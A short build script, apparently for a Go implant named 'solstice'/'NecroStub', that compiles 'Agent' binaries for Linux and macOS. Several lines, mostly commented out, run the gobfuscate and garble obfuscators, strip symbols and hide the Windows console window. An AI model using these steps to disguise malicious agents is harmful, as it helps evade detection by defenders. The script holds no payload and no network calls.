#REM .\gobfuscate.exe -verbose -outdir github.com/whiterabb17/solstice E:\Interactive\Clients\GoClient+\solstice.w\build\
#REM COPY .\build\src\github.com\whiterabb17\solstice\main.go obf_main.go
#REM del build -Recurse
#go build -o debug_gsolstice.exe .\main.go
#REM garble build -ldflags="-w -s" -o debug_osolstice.exe .\solsticeW.go

GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" -o ../../output/Agent/NecroStub.nix
GOOS=darwin GOARCH=amd64 go build -ldflags="-w -s" -o ../../output/Agent/NecroStub.mac
#MOVE Solstice.win.exe ..\Solstice.win.exe
#REM garble build -ldflags="-w -s -H=windowsgui" -o osolstice.exe .\solsticeW.go
